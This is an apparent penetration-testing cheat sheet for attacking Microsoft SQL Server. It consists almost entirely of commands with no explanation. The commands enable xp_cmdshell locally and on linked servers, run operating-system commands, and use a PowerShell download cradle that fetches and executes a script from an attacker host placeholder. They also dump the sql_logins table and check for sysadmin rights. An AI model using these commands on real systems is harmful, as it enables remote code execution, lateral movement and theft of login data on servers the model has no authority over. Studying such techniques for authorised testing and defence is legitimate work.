### Enable xp_cmdshell SQL Server configuration
```
mssql> enable_xp_cmdshell
```

### Execute shell command
```
mssql> EXEC xp_cmdshell <command>
```

### Download string and invoke expression
```
mssql> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://<lhost>/<file>.txt") | powershell -noprofile'
```

### Enable xp_cmdshell on linked servers
```
mssql> EXEC('sp_configure ''show advanced options'',1; reconfigure;') AT [<fdqnRhost>]
mssql> EXEC('sp_configure ''xp_cmdshell'',1; reconfigure;') AT [<fdqnRhost>]
mssql> SELECT * FROM OPENQUERY("<fqdnRhost>", 'select * from sys.configuration where name = ''xp_cmdshell''')
```

### Get hostname
```
SELECT HOST_NAME();
```

### Get tables
```
SELECT name FROM <database>..sysobjects;
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
```

### Get content of table
```
SELECT * FROM master..sql_logins;
```

### Get permissions
```
SELECT is_srvrolemember('sysadmin');
SELECT is_srvrolemember('serveradmin');
```

